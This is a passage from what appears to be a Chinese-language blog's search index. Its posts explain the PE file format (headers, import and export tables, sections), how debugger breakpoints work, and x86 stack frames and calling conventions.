class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Standard fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    WORD    Magic;<span class="comment">//PE32: 10B PE64: 20B</span></span><br><span class="line">    BYTE    MajorLinkerVersion;</span><br><span class="line">    BYTE    MinorLinkerVersion;</span><br><span class="line">    DWORD   SizeOfCode;<span class="comment">//所有含有代码的区块的大小 编译器填入 没用(可改)</span></span><br><span class="line">    DWORD   SizeOfInitializedData;<span class="comment">//所有初始化数据区块的大小 编译器填入 没用(可改)</span></span><br><span class="line">    DWORD   SizeOfUninitializedData;<span class="comment">//所有含未初始化数据区块的大小 编译器填入 没用(可改)</span></span><br><span class="line">    DWORD   AddressOfEntryPoint;<span class="comment">//程序入口RVA</span></span><br><span class="line">    DWORD   BaseOfCode;<span class="comment">//代码区块起始RVA</span></span><br><span class="line">    DWORD   BaseOfData;<span class="comment">//数据区块起始RVA</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// NT additional fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    DWORD   ImageBase;<span class="comment">//内存镜像基址(程序默认载入基地址)</span></span><br><span class="line">    DWORD   SectionAlignment; <span class="comment">//内存中对齐大小</span></span><br><span class="line">    DWORD   FileAlignment; <span class="comment">//文件中对齐大小(提高程序运行效率)</span></span><br><span class="line">    WORD    MajorOperatingSystemVersion;</span><br><span class="line">    WORD    MinorOperatingSystemVersion;</span><br><span class="line">    WORD    MajorImageVersion;</span><br><span class="line">    WORD    MinorImageVersion;</span><br><span class="line">    WORD    MajorSubsystemVersion;</span><br><span class="line">    WORD    MinorSubsystemVersion;</span><br><span class="line">    DWORD   Win32VersionValue;</span><br><span class="line">    DWORD   SizeOfImage;<span class="comment">//内存中整个PE文件的映射的尺寸,可比实际值大,必须是SectionAlignment的整数倍</span></span><br><span class="line">    DWORD   SizeOfHeaders; <span class="comment">//所有的头加上节表文件对齐之后的值</span></span><br><span class="line">    DWORD   CheckSum;<span class="comment">//映像校验和,一些系统.dll文件有要求,判断是否被修改</span></span><br><span class="line">    WORD    Subsystem;</span><br><span class="line">    WORD    DllCharacteristics;<span class="comment">//文件特性,不是针对DLL文件的,16进制转换2进制可以根据属性对应的表格得到相应的属性</span></span><br><span class="line">    DWORD   SizeOfStackReserve;</span><br><span class="line">    DWORD   SizeOfStackCommit;</span><br><span class="line">    DWORD   SizeOfHeapReserve;</span><br><span class="line">    DWORD   SizeOfHeapCommit;</span><br><span class="line">    DWORD   LoaderFlags;</span><br><span class="line">    DWORD   NumberOfRvaAndSizes;</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; <span class="comment">//数据目录表,结构体数组</span></span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure><p>如果想要编写一个PE解析器，那么就需要关注一下<code>FileAlignment</code> 以及 <code>SizeOfHeaders</code> 这两个成员。<code>SizeOfHeaders</code> 表示所有的头加上节表文件对齐之后的值，对齐的大小参考的就是 <code>FileAlignment</code> 成员，如果所有的头加上节表的大小为320，<code>FileAlignment</code> 为 200，那么 <code>SizeOfHeaders</code> 大小就为 400。下图中0x20000就是在内存中对齐的大小，0x400是程序在文件中的对其大小。</p><p><img src="https://p.sda1.dev/16/e62516580cfd25a5ad6cb805df6d881b/image.png" class="lazyload" data-srcset="https://p.sda1.dev/16/e62516580cfd25a5ad6cb805df6d881b/image.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"></p><p>最后一个成员数据目录表很重要。PE扩展头的最后一个成员是<code>IMAGE_DATA_DIRECTORY</code>结构体，定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   Size;</span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure><p>存储了导出表和导入表</p><h4 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h4><p>结构如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;<span class="comment">// 指针指向该导出表文件名字符串</span></span><br><span class="line">    DWORD   Base;<span class="comment">// 导出函数起始序号</span></span><br><span class="line">    DWORD   NumberOfFunctions;<span class="comment">// 所有导出函数的个数</span></span><br><span class="line">    DWORD   NumberOfNames;<span class="comment">// 以函数名字导出的函数个数</span></span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">// 指针指向导出函数地址表RVA</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">// 指针指向导出函数名称表RVA</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">// 指针指向导出函数序号表RVA</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><p>导出表的作用就是记载着动态链接库的一些导出信息。通过导出表，DLL文件可以向系统提供导出函数的名称、序号和入口地址等信息，以便Windows加载器通过这些信息来完成动态连接的整个过程。exe文件不存在导出表，一般存在于Dll文件中，导出 函数给别人用。不清楚Dll文件作用的可自行百度。</p><h4 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h4><p>结构如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics;            <span class="comment">//导入表结束标志</span></span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">//RVA指向一个结构体数组(INT表)</span></span><br><span class="line">    &#125;;</span><br><span class="line">    DWORD   TimeDateStamp;                  <span class="comment">//时间戳</span></span><br><span class="line">    DWORD   ForwarderChain;                 <span class="comment">// -1 if no forwarders</span></span><br><span class="line">    DWORD   Name;                           <span class="comment">//RVA指向dll名字，以0结尾</span></span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">//RVA指向一个结构体数组(IAT表)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR, *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>.exe 文件存在导入表，就是导入函数，然后自己使用。导入表在PE文件加载时，会根据这个表里的内容加载依赖的DLL ，并填充所需函数的地址。</p><p><code>OriginalFirstThunk</code>指向INT，<code>FirstThunk</code>指向IAT，当文件在磁盘中时，实际上 INT 和 IAT 的内容是一样的。</p><p><img src="https://p.sda1.dev/16/113e2e6939977bd526ebdc4c113fa11b/image.png" class="lazyload" data-srcset="https://p.sda1.dev/16/113e2e6939977bd526ebdc4c113fa11b/image.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"></p><p>而当文件加载到内存中时</p><p>INT表的结构不变，而IAT表则是直接存储了函数的地址</p><p><img src="https://p.sda1.dev/16/5e7f8708924cc5a16a14c2569ec3f4c2/image.png" class="lazyload" data-srcset="https://p.sda1.dev/16/5e7f8708924cc5a16a14c2569ec3f4c2/image.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"></p><h2 id="节表-1"><a href="#节表-1" class="headerlink" title="节表"></a>节表</h2><p>节表的结构如下，整体为40个字节。存储了PE代码和数据的结构数据，指示装载系统代码段在哪里，数据段在哪里等。</p><p>在标准PE头中定义好了文件节的数目。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME]; <span class="comment">//ASCII字符串 可自定义 只截取8个字节</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span>   <span class="comment">//该节在没有对齐之前的真实尺寸,该值可以不准确</span></span><br><span class="line">            DWORD   PhysicalAddress;</span><br><span class="line">            DWORD   VirtualSize;</span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;    <span class="comment">//内存中的偏移地址</span></span><br><span class="line">    DWORD   SizeOfRawData;   <span class="comment">//节在文件中对齐的尺寸</span></span><br><span class="line">    DWORD   PointerToRawData;   <span class="comment">//节区在文件中的偏移</span></span><br><span class="line">    DWORD   PointerToRelocations;</span><br><span class="line">    DWORD   PointerToLinenumbers;</span><br><span class="line">    WORD    NumberOfRelocations;</span><br><span class="line">    WORD    NumberOfLinenumbers;</span><br><span class="line">    DWORD   Characteristics;   <span class="comment">//节的属性</span></span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><h2 id="节数据-1"><a href="#节数据-1" class="headerlink" title="节数据"></a>节数据</h2><p>常见的节数据：<br>.text：代码段，是在编译或汇编结束时产生的一种块，它的内容全部是指令代码。也有的编译器将该段命名为.code<br>.data：初始化的数据块，是初始化的数据块，包含那些编译时被初始化的变量、字符串<br>.idata：输入表，包含其他外来dll的函数和数据信息，也就是输入表，也有人称之为导入表。<br>.rsrc：资源数据块，包含模块的全部资源数据，如图标、菜单、位图等。<br>.reloc：重定位表，用于保存基址的重定位表。即当装在程序不能按照连接器所指定的地址装载文件是，需要对指令或已经初始化的变量进行调整，该块中也包含了调整过程中所需要的一些数据，如果装载能够正常装在则忽略此段中的数据。<br>.edata：导出表，是pe文件的输出表，以供其他模块使用，并不是每个pe文件都有此数据段，因为有的文件并不需要输出一些函数，该数据段常见于动态连接库文件中。<br>.radata：存放调试目录、说明字符串，该数据块并不常见主要是用于存放一些调试信息。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>断点</title>
      <link href="/2021/09/20/%E6%96%AD%E7%82%B9/"/>
      <url>/2021/09/20/%E6%96%AD%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<p>​断点是用于帮助程序员分析bug和调试程序的一种技术，让程序在合适的地方暂停运行，查看内存信息。最开始是只顾着用了，没有了解过背后的原理。今天就来简单了解一下背后的机制原理。</p><span id="more"></span><h2 id="软断点"><a href="#软断点" class="headerlink" title="软断点"></a>软断点</h2><p>首先看一条指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x44332211    8BC3    MOV EAX, EBX</span><br><span class="line">#指令地址       #机器码     #汇编指令</span><br></pre></td></tr></table></figure><p>这时我们设置一个软断点，一般我们是通过中断指令INT3来实现，设置后指令如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x44332211    CCC3    MOV EAX, EBX</span><br><span class="line">#指令地址       #机器码     #汇编指令</span><br></pre></td></tr></table></figure><p>这里要明白一个概念：<strong>指令的机器码&#x3D;操作码+操作数</strong></p><p>CPU在执行完INT3指令后会触发异常，此异常会使操作系统从中断向量表中调用3号中断处理程序，首先检查是否存在调试器，如果存在调试器把异常交给调试器，调试器处理结束再返回。如果调试器不处理或者就不存在调试器则异常会传递到程序自身的异常处理中（如果最后依然没处理就会进行异常的第二次分发）。</p><p>但我们平常使用INT3断点调试时，汇编指令并没有发生变化，而是维持原样，之所以我们下断点的地址处字节没有发生任何变化是因为调试器为了维持汇编代码的可读性并没有将改变后的指令进行重新反汇编。我们先用程序验证一下，随便加载一个程序,在地址0x4015CE处下一个断点。</p><p><img src="https://s2.loli.net/2024/04/18/ElGBovcWYq4XS96.png" class="lazyload" data-srcset="https://s2.loli.net/2024/04/18/ElGBovcWYq4XS96.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240418202106461"></p><p>接下来把即将运行的下一条指令改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov  al , byte ptr ds:[0x4015CE]</span><br></pre></td></tr></table></figure><p>将下完断点地址处的值读入到寄存器$al$中</p><p><img src="https://s2.loli.net/2024/04/18/cjn7N9mrMAbzyV8.png" class="lazyload" data-srcset="https://s2.loli.net/2024/04/18/cjn7N9mrMAbzyV8.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240418202246065"></p><p>当我们执行完地址<code>0x4015B1</code>的代码后，可以看到$al$的值为<code>0xCC</code>。所以当$cpu$执行到断点(0x4015CE)时就会执行<code>0xCC</code>（INT3指令），接着产生异常去执行函数<code>nt!KiTrap03( )</code>，接着会调用<code>nt!KiDisPatchException( )</code>函数并将异常分发给调试器，其刚执行完<code>0xCC</code>此时$eip$指向<code>0xCC</code>的下一个字节，调试器会让$eip$减一，然后$eip$重新指向<code>0xCC</code>（断点处）而调试器将先还原此断点处的原字节，然后使返回程序将停在此断点处等待用户的进一步操作。</p><p>我们来验证一下这个过程。</p><p>这次我们把断点处的汇编指令改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov  al , byte ptr ds:[0x4015CE]</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/04/18/XYVlWSUoNcHBe6i.png" class="lazyload" data-srcset="https://s2.loli.net/2024/04/18/XYVlWSUoNcHBe6i.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240418203732694"></p><p>对应的原字节<code>A0</code>，我们运行到断点后查看寄存器EAX</p><p><img src="https://s2.loli.net/2024/04/18/WrhOTj7ptYJZm2A.png" class="lazyload" data-srcset="https://s2.loli.net/2024/04/18/WrhOTj7ptYJZm2A.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240418203552146"></p><p>$al$的值等于<code>A0</code>，说明断点处的字节已被修复。</p><p>为了让这个断点一直生效，程序会利用单步异常来把断点处的值再改为<code>0xCC</code>。其在执行完断点处的指令后，会产生单步异常从而被调试器捕捉，然后调试器会将此断点处的值更改为<code>0xCC</code>。我们可以利用如下方法验证。</p><p>将断点后的指令改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov  al , byte ptr ds:[0x4015CE]</span><br></pre></td></tr></table></figure><p>我们在断点执行语句后看到$al$值为<code>A0</code></p><p><img src="https://s2.loli.net/2024/04/18/ul96mWAo1TECdSi.png" class="lazyload" data-srcset="https://s2.loli.net/2024/04/18/ul96mWAo1TECdSi.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240418204234086"></p><p>执行后就改为<code>0xCC</code></p><p><img src="https://s2.loli.net/2024/04/18/wM8HYkeLoI6JWGO.png" class="lazyload" data-srcset="https://s2.loli.net/2024/04/18/wM8HYkeLoI6JWGO.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240418204342799"></p><blockquote><p>实际上，一般情况下，调试器维护了一大组调试断点，并把他们都换成了INT 3。在被运行结束后，会回填回去，并通过现在的地址判断是到了那个断点。软件断点没有数目限制。</p></blockquote><h2 id="硬断点"><a href="#硬断点" class="headerlink" title="硬断点"></a>硬断点</h2><p>硬件断点是通过位于 CPU 上的一组特殊寄存器来实现的，称为调试寄存器，与被调试程序无关。比如 x86 架构的 CPU 上有 8 个调试寄存器（DR0-DR7），分别用于设置和管理硬件断点。硬件断点比软件断点的功能更强，除了函数断点外，还可以数据断点，可以指定当数据被读或写时中断。硬件断点的本质就是在指定内存下断点，内存可以位于代码段（函数断点）也可以是数据段（数据断点）。可以设置事件有执行、写入、读写时中断。</p><ul><li>DR0-DR3 负责存储硬件断点的内存地址，所以最多只能同时使用 4 个硬件断点。</li><li>DR4 和 DR5 保留使用。</li><li>DR6 为调试状态寄存器，记录上一次断点触发所产生的调试事件类型信息。</li><li>DR7 是硬件断点的激活开关，存储着各个断点的触发信息条件。 与软断点不同的是，硬件断点使用 1 号中断（INT1）实现，INT1 一般被用于硬件断点和单步事件。</li></ul><p>CPU 每次试图执行一条指令时，都会首先检查当前指令所在地址是否被设置了有效的硬件断点，除此之外还会检查当前指令包含的操作数是否位于被设置了硬件断点的内存地址。</p><h2 id="内存断点"><a href="#内存断点" class="headerlink" title="内存断点"></a>内存断点</h2><p>内存断点本质上不是一个真正的断点。当调试器设置一个内存断点时，实际上是改变一个内存区域或一个内存页的权限。操作系统对内存页会设置访问权限，可执行、可读、可写、保护页，这些访问权限可以组合。</p><p><strong>保护页的特性可以帮助我们实现断点机制。</strong></p><p>任何对于有页保护的区域的内存访问都会导致 CPU 暂停执行当前进程并处发一个保护页调试异常，然后我们就可以对访问缓冲取得指令代码进行仔细的检查，并判断出应用程序如何处理缓冲区中的内容。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>栈帧</title>
      <link href="/2021/09/20/%E6%A0%88%E5%B8%A7/"/>
      <url>/2021/09/20/%E6%A0%88%E5%B8%A7/</url>
      
        <content type="html"><![CDATA[<p>栈作为重要的数据结构，主要用于管理程序的执行过程中的函数调用和局部变量。它通过后进先出的原则存储和管理数据，包括函数的参数、返回地址、局部变量等。</p><span id="more"></span><h2 id="重要概念"><a href="#重要概念" class="headerlink" title="重要概念"></a>重要概念</h2><h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><p>栈在数据结构中是一种运算受限的线性表，即我们只能对表尾进行操作，称之为栈顶，相对的，另一端称为栈底。它按照先进后出的原则存储数据，先进入的数据保存在栈底，后来的数据保存在栈顶。栈中的数据都是以栈帧（Stack Frame）的格式存在，栈帧是一个内存区块，存储了函数调用时所需要使用的信息。</p><h3 id="EBP"><a href="#EBP" class="headerlink" title="EBP"></a>EBP</h3><p>栈底指针</p><h3 id="ESP"><a href="#ESP" class="headerlink" title="ESP"></a>ESP</h3><p>栈顶指针</p><h3 id="call"><a href="#call" class="headerlink" title="call"></a>call</h3><p>汇编语言，调用函数时需要使用call来调用</p><h3 id="retn"><a href="#retn" class="headerlink" title="retn"></a>retn</h3><p>函数调用结束后返回。当retn指令执行时是将esp指向地址的值弹出到EIP寄存器中，表示返回到调用函数的下一条指令。</p><h2 id="开辟栈帧"><a href="#开辟栈帧" class="headerlink" title="开辟栈帧"></a>开辟栈帧</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">;栈帧结构</span><br><span class="line">PUSH EBP            ;函数开始（使用EBP前先把已有值保存到栈中）</span><br><span class="line">MOV EBP, ESP        ;保存当前ESP到EBP中（保存返回地址）</span><br><span class="line"></span><br><span class="line">...                 ;函数体</span><br><span class="line">                    ;无论ESP值如何变化，EBP都保持不变，可以安全访问函数的局部变量、参数</span><br><span class="line"></span><br><span class="line">MOV ESP, EBP        ;将函数的起始（返回）地址给到ESP</span><br><span class="line">POP EBP             ;函数返回前弹出保存在栈中的值</span><br><span class="line">RETN                ;函数终止，返回到调用前的下一条指令</span><br></pre></td></tr></table></figure><h2 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h2><p>在栈帧的开辟中涉及到函数的调用。例如有一个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">test</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>;</span><br></pre></td></tr></table></figure><p>编写代码时我们肯定理解这个函数如何传参，传几个参数。但是CPU怎么才能知道这个函数有几个参数，参数的值是什么，为了解决这些问题，计算机提供了一种被称为栈的数据结构来支持参数传递。</p><p>但是还有问题没有解决，当函数传递参数时，按照什么样的顺序传参，是从左到右还是从右到左，调用结束后如何清除堆栈，由调用者清除还是被调用者清除以及寄存器如何使用。这时就提出了<strong>函数调用约定</strong>来解决这个问题</p><h3 id="stdcall"><a href="#stdcall" class="headerlink" title="stdcall"></a>stdcall</h3><p>声明的语法为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">function</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>;</span><br></pre></td></tr></table></figure><p>stdcall的调用约定意味着：</p><ul><li>参数从右向左压入堆栈</li><li>函数自身清理堆栈</li><li>函数名自动加前导的下划线，后面紧跟一个@符号，其后紧跟着参数的尺寸</li></ul><h3 id="cdecl"><a href="#cdecl" class="headerlink" title="cdecl"></a>cdecl</h3><p>是C和C++默认的调用约定</p><p>声明的语法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">function</span> <span class="params">(<span class="type">int</span> a ,<span class="type">int</span> b)</span>; <span class="comment">//不加修饰就是C调用约定 </span></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">function</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>;<span class="comment">//明确指出C调用约定</span></span><br></pre></td></tr></table></figure><p>cdecl调用约定意味着：</p><ul><li>参数从右向左压入堆栈</li><li>调用者负责清理堆栈</li><li>C调用约定允许函数的参数的个数是不固定的，这也是C语言的一大特色。</li><li>仅在函数名前加上一个下划线前缀，格式为_functionname。</li></ul><h3 id="fastcall"><a href="#fastcall" class="headerlink" title="fastcall"></a>fastcall</h3><p>声明语法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> fastcall <span class="title function_">function</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>;</span><br></pre></td></tr></table></figure><p>fastcall调用约定意味着：</p><ul><li>函数的第一个和第二个DWORD参数（或者尺寸更小的）通过ecx和edx传递，其他参数通过从右向左的顺序压栈</li><li>函数自身清理堆栈</li><li>函数名修改规则同stdcall:函数名自动加前导的下划线，后面紧跟一个@符号，其后紧跟着参数的尺寸。</li></ul><h3 id="thiscall"><a href="#thiscall" class="headerlink" title="thiscall"></a>thiscall</h3><p>C++类成员函数缺省的调用约定</p><p>thiscall是唯一一个不能明确指明的函数修饰，因为thiscall不是关键字。由于成员函数调用还有一个this指针，因此必须特殊处理，thiscall意味着:</p><ul><li>参数从右向左入栈</li><li>如果参数个数不确定，this指针在所有参数压栈后被压入堆栈。如果参数个数确定，this指针通过ecx传递给被调用者。</li><li>如果参数个数不确定，调用者清理堆栈，否则函数自己清理堆栈</li></ul><p>对于参数个数固定情况下，类似于stdcall，不定时则类似cdecl</p><h3 id="naked-call"><a href="#naked-call" class="headerlink" title="naked call"></a>naked call</h3><p>一个很少见的调用约定，一般用于实模式驱动程序设计</p>]]></content>
      
      
      <categories>
          
          <category> 二进制基础 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
